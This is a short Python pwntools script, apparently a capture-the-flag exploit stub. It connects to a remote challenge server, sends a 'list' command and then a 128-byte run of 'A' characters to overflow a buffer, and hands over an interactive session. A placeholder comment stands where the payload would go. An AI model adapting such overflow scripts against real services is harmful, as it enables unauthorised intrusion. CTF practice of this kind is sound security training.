from pwn import * 
import struct

qq =  b'A' * (77+51)

context(arch = 'i386', os = 'linux')
#r = process('./hello')
r = remote('ctf.adl.tw', 11007)
# EXPLOIT CODE GOES HERE
r.sendline("list")
r.recv()
r.sendline(qq)
r.recv()
r.interactive()